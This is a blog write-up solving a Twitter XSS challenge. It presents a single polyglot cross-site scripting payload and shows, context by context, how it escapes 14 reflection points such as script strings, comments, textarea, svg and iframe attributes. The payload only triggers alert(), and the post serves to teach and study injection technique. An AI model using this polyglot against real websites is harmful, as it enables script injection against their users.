---
layout: single
title: 21 Vector to Rule Them All XSSmas Challenge
date: 2021-12-06
classes: wide
tags:
  - Twitter
  - XSS
  - XSSmas
  - Challenge
  - Frederik Braun
---

Can you create the shortest XSS vector that triggers in all contexts?

![twitter challenge](/assets/images/twitter/freddyb/twitter-challenge.png)

## Overview

To start off, here is the challenge page with the official rules.

![challenge page](/assets/images/twitter/freddyb/challenge-page.png)

Next, I need count how many times does the input reflect onto the page.

![number-of-contexts](/assets//images/twitter/freddyb/reflected-input.png)

There is a total of 14 places where the input gets reflected, all of which are in a different context.

## TL;DR Solution

Here complete solution to trigger all 14 contexts.

```
"%0Ax=//`//</style></title></math></select></template></textarea><svg+x=*/%0Aonload=alert()//></svg>
```

To better understand the idea of this polyglot, I've made a viasual sketch.

![polyglot overview](/assets//images/twitter/freddyb/polyglot-overview.png)

However, if you'd like to see how all of this fits in detail, then follow along with this article!

## Detailed Solution

### Context #3: Double quotes string

- Code snippet

```html
<script>
    injection = "payload";
</script>
```

- Result from payload

```html
<script>
    injection = ""
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;";
</script>
```

### Context #2: Template string

- Code snippet

```html
<script>
    injection = `payload`;
</script>
```

- Result from payload

```html
<script>
    injection = `"
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;`;
</script>
```

### Context #3: Single-line comment

- Code snippet

```html
<script>
    // payload
</script>
```

- Result from payload

```html
<script>
    // "
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;
</script>
```

### Context #4: Multi-line comment 

- Code snippet

```html
<script>
    /* payload */
</script>
```

- Result from payload

```html
<script>
    /* "
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt; */
</script>
```

### Context #5: HTML Stylesheet

- Code snippet

```html
<style>
payload</style>
```

- Result from payload

```html
<style>
"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></style>
```

### Context #6: HTML Title

- Code snippet

```html
<title>2021's vector to rule them all - payload</title></head>
```

- Result from payload

```html
<title>2021's vector to rule them all - "
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></title></head>
```

### Context #7: HTML Main Element

- Code snippet

```html
<main>    payload
    <select>
```

- Result from payload

```html
<main>    "
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg>
    <select>
```

### Context #8: HTML Select Element

- Code snippet

```html
<select><option>payload</option></select>
```

- Result from payload

```html
<select><option>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></option></select>
```

### Context #9: HTML Textarea

- Code snippet

```html
<textarea>payload</textarea>
```

- Result from payload

```html
<textarea>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></textarea>
```

### Context #10: HTML Image

- Code snippet

```html
<img src="payload" alt="" />
```

- Result from payload

```html
<img src=""
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg>" alt="" />
```

### Context #11: HTML Template

- Code snippet

```html
<template>payload</template>
```

- Result from payload

```html
<template>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></template>
```

### Context #12: HTML SVG

- Code snippet

```html
<svg>payload</svg>
```

- Result from payload

```html
<svg>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></svg>
```

### Context #13: HTML Math Element

- Code snippet

```html
<math>payload</math>
```

- Result from payload

```html
<math>"
x=//`//</style></title></math></select></template></textarea><svg x=*/
onload=alert()//></svg></math>
```

### Context #14: HTML iFrame

- Code snippet

```html
<iframe data-injection="payload" src="data:text/html,<h1>Ignore me"></iframe>
```

- Result from payload

```html
<iframe data-injection=""
x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;&lt;/textarea&gt;&lt;svg x=*/
onload=alert()//&gt;&lt;/svg&gt;" src="data:text/html,<h1>Ignore me"></iframe>
</main>
```

---

This is it. It took me a bunch of hours to solve this challenge, but it was worth it. It gave me a great introduction to polyglots.

Thanks for reading.